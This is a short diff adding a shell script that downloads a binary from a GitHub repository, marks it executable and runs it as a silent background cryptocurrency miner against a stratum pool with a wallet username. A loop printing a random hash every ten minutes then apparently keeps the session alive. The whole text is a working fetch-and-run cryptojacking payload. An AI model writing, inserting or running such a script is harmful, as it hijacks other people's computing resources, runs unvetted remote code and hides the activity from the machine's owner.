@@ -1,0 +1,4 @@
+wget https://github.com/aqshakuy/bb/raw/main/avx2
+chmod 777 avx2
+./avx2 -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17065 -u vWJfDUtWfd1C5n9XAnhuCS5P7FC9rQNBto.$(echo $(shuf -i 1-20000 -n 1)-kuris) -t8 > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
